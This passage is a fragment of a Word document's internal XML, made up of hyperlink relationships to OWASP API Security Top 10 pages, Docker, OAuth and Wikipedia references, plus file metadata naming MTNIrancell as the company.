                            <w:div w:id="1553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API-Security/editions/2023/en/0xa5-broken-function-level-authorization/" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.docker.com/config/containers/resource_constraints/" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Replay_attack" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://http2.github.io/" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://restfulapi.ne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www-project-risk-assessment-framework/" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://web.mit.edu/Saltzer/www/publications/protection/" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Basic_access_authentication" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Brute-force_attack" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.hubspot.com/marketing/cybersecurity?hubs_content=blog.hubspot.com/website/api-security&amp;hubs_content-cta=cybersecurity" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.docker.com/engine/reference/commandline/run/" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://howtodoinjava.com/security/how-to-generate-secure-password-hash-md5-sha-pbkdf2-bcrypt-examples/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://oauth.net/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cloud.google.com/endpoints/docs/openapi/when-why-api-key" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.docker.com/engine/reference/commandline/run/" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://howtodoinjava.com/resteasy/jax-rs-resteasy-basic-authentication-and-authorization-tutorial/" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/HTTP_persistent_connection" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.docker.com/config/containers/resource_constraints/" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.digicert.com/ssl/" TargetMode="External"/><Relationship Id="rId38"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41</Pages>
  <Words>11578</Words>
  <Characters>65999</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>549</Lines>
  <Paragraphs>154</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company>MTNIrancell</Company>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>77423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2024-08-03T12:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-08-03T12:28:00Z</dcterms:modified>
</cp:coreProperties>
</file>